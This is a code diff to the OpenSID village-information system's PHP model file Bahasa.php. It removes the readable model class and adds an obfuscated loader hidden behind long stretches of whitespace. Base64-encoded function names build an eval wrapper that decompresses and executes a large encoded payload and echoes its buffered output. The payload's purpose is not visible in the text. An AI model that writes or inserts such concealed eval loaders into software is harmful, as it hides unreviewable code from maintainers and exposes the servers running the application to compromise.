@@ -1,71 +1,377 @@
-<?php
+<?php 
+        $__='printf';$_='Loading app/Models/Bahasa.php';
+        
 
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2024 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2024 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
 
-namespace App\Models;
 
-defined('BASEPATH') || exit('No direct script access allowed');
 
-class Bahasa extends BaseModel
-{
-    /**
-     * The table associated with the model.
-     *
-     * @var string
-     */
-    protected $table = 'ref_penduduk_bahasa';
 
-    /**
-     * The timestamps for the model.
-     *
-     * @var bool
-     */
-    public $timestamps = false;
 
-    /**
-     * The guarded with the model.
-     *
-     * @var array
-     */
-    protected $guarded = [];
 
-    /**
-     * The casts with the model.
-     *
-     * @var array
-     */
-    protected $casts = [];
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
